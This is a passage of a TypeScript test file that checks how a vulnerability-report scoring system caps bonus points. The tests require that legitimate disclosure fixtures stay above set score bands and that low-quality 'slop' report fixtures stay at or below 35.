    // rich fixture clips (legit-11-confluence-ognl, rawSum=15 → 12).
    const capClippers = richRows.filter((r) => r.capHit);
    expect(
      capClippers.length,
      `no rich fixture clips the cap; rawSums=${richRows
        .map((r) => `${r.name}:${r.rawSum}`)
        .join(
          ", ",
        )} — cap=${GOLD_SIGNAL_BONUS_CAP} must bite on at least one real disclosure shape`,
    ).toBeGreaterThanOrEqual(1);
    // Every rich fixture must fire ≥3 strong-evidence categories — that's
    // the definition of "rich" and the criterion the calibration relies on.
    for (const r of richRows) {
      expect(
        r.signalCount,
        `${r.name} fired ${r.signalCount} categories (${r.signalIds.join(",")}) — rich fixtures must fire ≥3`,
      ).toBeGreaterThanOrEqual(3);
    }
  });

  // Calibration finding (b): the cap doesn't over-suppress legit
  // reports. Under the legacy AVRI-off path, every legit fixture (rich
  // or otherwise) must still clear the LEGIT minScore band
  // (composite ≥ 50, matching the legit-03-request-smuggling lower
  // bound). Additionally, every cap-clipping rich fixture must still
  // land in PROMISING (≥ 60) — proving that the up-to-3pt of cap
  // clipping these real disclosures incur doesn't knock them out of
  // the legitimate-finding bands. (Task #478 lowered the prior STRONG
  // ≥75 floor to PROMISING ≥60 because real-world reports don't always
  // hit the synthetic-max-style 81 composite the original anchor did.)
  it("(b) the cap doesn't over-suppress legit or richly-evidenced reports", () => {
    const legitRows = FIXTURES.filter(
      (f) => f.kind === "legit" || f.kind === "legit-rich",
    ).map(rowFor);
    for (const r of legitRows) {
      expect(
        r.legacyComposite,
        `${r.name} legacy composite=${r.legacyComposite} bonus=${r.bonus}/${GOLD_SIGNAL_BONUS_CAP}`,
      ).toBeGreaterThanOrEqual(50);
    }
    const capClippers = legitRows.filter((r) => r.capHit);
    expect(capClippers.length).toBeGreaterThanOrEqual(1);
    for (const r of capClippers) {
      expect(
        r.legacyComposite,
        `${r.name} clipped ${r.rawSum - GOLD_SIGNAL_BONUS_CAP}pt at the cap and only scored ${r.legacyComposite} on the legacy path — cap must not push cap-clipping rich reports below PROMISING (60)`,
      ).toBeGreaterThanOrEqual(60);
    }
  });

  // Calibration finding (c): the cap doesn't let cleverly-crafted slop
  // sneak past thresholds. Under the legacy AVRI-off path, every slop /
  // curl-slop fixture must still land below the LIKELY-INVALID/HIGH-RISK
  // boundary (composite ≤ 35 mirrors the SLOP_FIXTURES expectMaxScore
  // baseline). If a slop fixture were to fire enough gold signals to
  // approach the cap, this would catch it — today every slop fixture
  // fires zero gold signals, which is exactly the design intent.
  it("(c) cleverly-crafted slop never sneaks past thresholds (legacy path ≤ 35)", () => {
    const slopRows = FIXTURES.filter(
      (f) => f.kind === "slop" || f.kind === "curl-slop",
    ).map(rowFor);
    for (const r of slopRows) {
      expect(
        r.legacyComposite,
        `${r.name} legacy composite=${r.legacyComposite} bonus=${r.bonus}/${GOLD_SIGNAL_BONUS_CAP} signals=${r.signalIds.join(",") || "(none)"}`,
      ).toBeLessThanOrEqual(35);
    }
  });
});
